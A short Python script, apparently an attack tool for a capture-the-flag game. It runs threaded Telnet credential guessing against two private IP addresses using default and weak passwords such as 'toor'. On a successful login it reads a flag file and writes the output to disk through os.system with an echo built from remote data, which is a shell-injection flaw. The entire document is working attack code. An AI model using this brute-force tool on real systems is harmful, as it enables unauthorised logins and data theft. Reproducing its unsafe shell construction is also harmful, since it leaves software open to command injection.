from time import sleep
from os import system
from telnetlib import Telnet
from threading import Thread

def con_telnet(host,username,password):
    tel=Telnet(host=host)
    tel.read_until(":".encode())
    tel.write((username+"\r\n").encode())
    tel.read_until(":".encode())
    tel.write((password+"\r\n").encode())
    t=tel.read_until(username.encode(),timeout=5)
    if (t.find("incorrect".encode()) != -1):
        pass
    else:
        if(t.find(("["+username).encode()) == -1 ):
            tel.write("type c:\\flag.txt\r\n".encode())
        else:
            tel.write("cat /flag.txt\r\n".encode())
        tel.write("exit\r\n".encode())
        data=tel.read_all().decode()
        print(f"get flag {host} {username} {password}")
        system("echo \""+data +"\" > "+host+".txt")

if __name__ == "__main__":
    host_list=["192.168.158.136","192.168.158.144"]
    username_list=["Administrator","root"]
    password_list=["qwe`123","toor"]
    for host in host_list:
        for username in username_list:
            for password in password_list:
                t=Thread(target=con_telnet,args=(host,username,password))
                t.start()
                sleep(0.5)
